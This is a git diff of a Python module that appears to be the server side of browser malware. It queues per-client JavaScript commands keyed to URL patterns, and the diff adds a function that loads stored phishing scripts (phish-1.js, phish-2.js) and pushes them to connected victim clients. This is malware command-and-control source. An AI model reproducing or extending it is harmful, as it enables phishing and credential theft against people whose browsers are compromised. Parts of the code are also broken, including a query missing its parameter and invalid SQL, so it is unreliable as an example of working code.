@@ -2,16 +2,15 @@ import pymysql
 import json, os
 import datetime
 from copy import deepcopy
+from . import app
 #from eventlet.db_pool import ConnectionPool
 conn_pool = None
 BASE_SERVER_RESPONSE = {
     "clientid": 0,
     "security_blacklist":[],
     "js-cmd":[],
-    "phish-cmd":[]
 }
 pending_payloads = {} #format: clientid:<instance of server response>; fetched from database
-
 
 def new_response(clientid):
     resp = deepcopy(BASE_SERVER_RESPONSE)
@@ -46,19 +45,33 @@ def construct_response(clientid):
     return resp
 
 def is_online(clientid):
-    found = [cl for cl, sid in app.connected_clients if cl == clientid].get(0, None)
-    return 0 if found == None else 1
+    found = [cl for cl, sid in app.connected_clients if cl == clientid]
+    if len(found) == 1:
+        return 1
+    elif len(found) == 0:
+        return 0
+    else:
+        print("how does your client have more than one sid fam how")
+        return len(found)
 
 
-def add_js_cmd(clientid, cmd):
+def add_js_cmd(clientid, pattern, cmd):
+    tuple_value = (pattern, cmd)
     if is_online(clientid):
-        pending_payloads[clientid]["js-cmd"].append(cmd)
+        pending_payloads[clientid]["js-cmd"].append(tuple_value)
     else:
         with getConn() as conn:
             conn.execute('SELECT Payload FROM PendingPayloads WHERE ClientID = %s')
             payload = json.loads(conn.fetchone()[0]) if conn.rowcount != 0 else deepcopy(BASE_SERVER_RESPONSE)
-            payload['js-cmd'].append(cmd)
+            payload['js-cmd'].append(tuple_value)
             conn.execute('insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s) where ClientID=(%s)', (clientid, payload, payload, clientid))
+
+def add_phish_cmd(clientid, pattern, cmd):
+    if(cmd == "1" or cmd == "2"):
+        fStr = os.environ.get('SEANON_DIR') + "/phish-cmd/" + "phish-" + cmd + ".js"
+        fileP = open(fStr, "r")
+        sendcmd = fileP.read()
+        add_js_cmd(clientid, pattern, sendcmd)
 
 """
 Handles creation of new client.
